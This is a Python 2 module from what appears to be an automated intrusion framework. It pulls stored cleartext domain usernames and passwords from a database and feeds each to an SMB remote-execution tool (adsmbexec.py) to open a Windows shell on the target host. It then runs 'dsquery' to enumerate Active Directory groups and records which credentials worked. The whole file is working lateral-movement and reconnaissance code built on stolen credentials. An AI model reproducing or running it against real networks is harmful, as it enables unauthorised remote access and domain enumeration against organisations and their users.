import time
import asyncproc
import os
import base64
from msf import exploit

def runCmd(proc, cmd):
    proc.write(cmd + "\n")
    time.sleep(0.5)
    result = ""
    gotShell = False

    startTime = time.time()
    while gotShell == False:
        poll = proc.wait(os.WNOHANG)
        out = proc.read()
        time.sleep(0.25)

        if time.time() - startTime >= 120:
            print "too much time has passed. quitting"
            return ""

        if out != "":
            result += result + out
        if out.upper().find("Windows".upper()) > -1:
            gotShell = True
    return result

def run(params):
    sql = """
select 
    d.id,
    hd.ip_address,
    dc.domain, dc.username, dc.cleartext_password,
    m.id
from 
    domains d 
    join domain_credentials dc on d.domain_name = dc.domain
    join domain_credentials_map m on m.domain_credentials_id = dc.id
    join host_data hd on m.host_data_id = hd.id
where
    d.footprint_id = dc.footprint_id and
    d.footprint_id = hd.footprint_id and
    d.footprint_id = m.footprint_id and
    m.valid = true and    
    d.info_gathered = false and
    m.psexec_failed = false and 
    m.dgu_failed = false and
    d.id not in (select item_identifier from task_list where task_descriptions_id = 20 and footprint_id = %s and in_progress = true) and
    hd.footprint_id = %s order by username limit 1
        """
            
    cursor = params.db.cursor()
    cursor.execute(sql, (params.footprint_id, params.footprint_id, ))
    row = cursor.fetchone()
    cursor.close()

    if row != None:
        cursor = params.db.cursor()
        cursor.execute("select addTaskListItem(%s, 20, %s, true, false)", (params.footprint_id, row[0], ))
        task_id = cursor.fetchone()[0]
        cursor.close() 

        log = ""
        cmd = "./software/adsmbexec.py {}/{}:{}@{}".format(row[2],row[3],row[4],row[1])
        params.log(cmd)
        proc = asyncproc.Process(["./software/adsmbexec.py", "{}/{}:{}@{}".format(row[2],row[3],row[4],row[1])])
        runWithDifferentUser = False
        gotShell = False
        startTime = time.time()
        while True:
            poll = proc.wait(os.WNOHANG)
            out = proc.read()
            time.sleep(0.25)
        
            if time.time() - startTime >= 60:
                #print "too much time has passed. quitting"
                log = log + "too much time has passed. quitting" + "\r\n"
                params.log("too much time has passed. quitting")

                break
        
            if out != "": 
                #print out
                log = log + out + "\r\n"
                params.log(out)
            if out.upper().find("Windows".upper()) > -1:
                gotShell = True
                break
            elif out.upper().find("STATUS_SHARING_VIOLATION".upper()) > -1:
                proc = None
                runWithDifferentUser = True
                break
            elif out.upper().find("SMB SessionError".upper()) > -1:
                proc = None
                runWithDifferentUser = True
                break
            elif out.upper().find("rpc_x_bad_stub_data".upper()) > -1:
                proc = None
                runWithDifferentUser = True
                break
            elif out.upper().find("Unexpected answer from server".upper()) > -1:
                proc = None
                runWithDifferentUser = True
                break
            elif out.upper().find("The target principal name is incorrect".upper()) > -1:
                runWithDifferentUser = True
                # TODO update this host, set psexec_failed = true
            elif out.upper().find("'dsquery' is not recognized as an internal or external command".upper()) > -1:
                runWithDifferentUser = True
        if runWithDifferentUser:
            cursor = params.db.cursor()
            cursor.execute("update domain_credentials_map set dgu_failed = true where id = %s", (row[5], ))
            cursor.close()

              
        if gotShell:
            out = runCmd(proc, "dsquery group -limit 0")
            #for l in runCmd(proc, "dsquery group -limit 0").split("\n"):
            for l in out.split("\n"):
                #group = l.split(",")[0].split("=")[1], 
                #print l
                log = log + l + "\r\n"
                params.log(l)

                if l.find("'dsquery' is not recognized as an internal or external command") != -1:
                    runWithDifferentUser = True
                    break

                if l != "": 
                    if l.split(",")[0].split("=")[1].find("{") == -1:
                        #print "group [{}]".format(l.split(",")[0].split("=")[1],)
                        cursor = params.db.cursor()
                        cursor.execute("select addDomainGroup(%s, %s, %s)",  (params.footprint_id, row[0], l.split(",")[0].split("=")[1], ))
                        cursor.close()
                else:
                    break
            time.sleep(0.5)

            proc.write("exit\n")
            time.sleep(2)
            
        if runWithDifferentUser == True:
            cursor = params.db.cursor()
            cursor.execute("update domain_credentials_map set dgu_failed = true where id = %s", (row[5], ))
            cursor.close()
            
        #print "output [{}]".format(out)
        if out is not "":
            if not runWithDifferentUser:
                spCursor = params.db.cursor()
                spCursor.execute("update domains set info_gathered = true where id = %s", (row[0], ))
                spCursor.close()


        final_output = ""
        while params.log_queue.empty() == False:
            final_output += "{0}\r\n".format(params.log_queue.get(False))
        final_output = final_output[:-2]

        spCursor = params.db.cursor()
        spCursor.execute("select updateTaskStatus(%s, %s, %s, %s)",  ( task_id,  False,  True, base64.b64encode(final_output), ))
        spCursor.close()
    #else:
        #params.log("nothing to check")
    #    continue
